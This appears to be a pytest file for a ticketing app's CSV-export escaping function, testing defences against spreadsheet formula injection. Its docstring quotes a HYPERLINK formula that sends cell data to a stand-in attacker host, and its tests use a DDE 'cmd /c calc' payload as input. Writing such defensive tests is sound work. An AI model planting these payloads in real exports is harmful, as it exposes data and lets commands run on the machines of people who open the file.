"""CSV formula injection (spec09 §6, §8).

Every exported text field is customer-supplied. A subject line of
`=HYPERLINK("http://attacker/"&A1,"Click")` becomes a live formula the moment an
admin opens the file, which is why this is a domain rule with its own tests
rather than an inline `if` in the export service.
"""

import uuid
from datetime import UTC, datetime

import pytest

from app.domain.csv_safety import INJECTION_PREFIXES, escape_field
from app.models.enums import Priority, TicketStatus


@pytest.mark.parametrize("prefix", INJECTION_PREFIXES)
def test_every_injection_prefix_is_neutralised(prefix: str) -> None:
    assert escape_field(f"{prefix}cmd|'/c calc'!A1") == f"'{prefix}cmd|'/c calc'!A1"


@pytest.mark.parametrize("prefix", INJECTION_PREFIXES)
def test_leading_whitespace_does_not_smuggle_a_prefix_past_the_check(prefix: str) -> None:
    """Some spreadsheets strip leading whitespace *before* deciding whether a
    cell is a formula, so a naive `startswith` on the raw string would miss it."""
    assert escape_field(f" \t{prefix}SUM(A1)").startswith("'")


def test_ordinary_text_is_untouched() -> None:
    # Over-escaping is its own bug: an apostrophe in front of every subject line
    # makes the export ugly and breaks anyone matching on exact strings.
    assert escape_field("Printer is offline") == "Printer is offline"
    assert escape_field("Order #4021 — urgent") == "Order #4021 — urgent"


def test_a_negative_number_is_escaped_because_the_rule_is_textual() -> None:
    """`-` is an injection prefix, so a negative value is quoted.

    Accepted deliberately: no exported column is a negative number, and
    exempting numerics would mean the check depends on parsing, which is
    exactly where these bypasses live.
    """
    assert escape_field("-5") == "'-5"


def test_none_becomes_empty_not_the_word_none() -> None:
    # An unassigned ticket must export a blank cell, not the string "None",
    # which would sort and filter as a real assignee name.
    assert escape_field(None) == ""


def test_enums_render_as_their_member_name() -> None:
    # `str(Priority.HIGH)` would give "Priority.HIGH" in a column header'd
    # "priority" — noise in every row.
    assert escape_field(Priority.HIGH) == "HIGH"
    assert escape_field(TicketStatus.PENDING_CUSTOMER) == "PENDING_CUSTOMER"


def test_datetimes_render_as_iso_8601() -> None:
    at = datetime(2026, 8, 25, 14, 30, tzinfo=UTC)
    assert escape_field(at) == "2026-08-25T14:30:00+00:00"


def test_booleans_and_uuids_round_trip_readably() -> None:
    assert escape_field(True) == "true"
    assert escape_field(False) == "false"
    ident = uuid.uuid4()
    assert escape_field(ident) == str(ident)
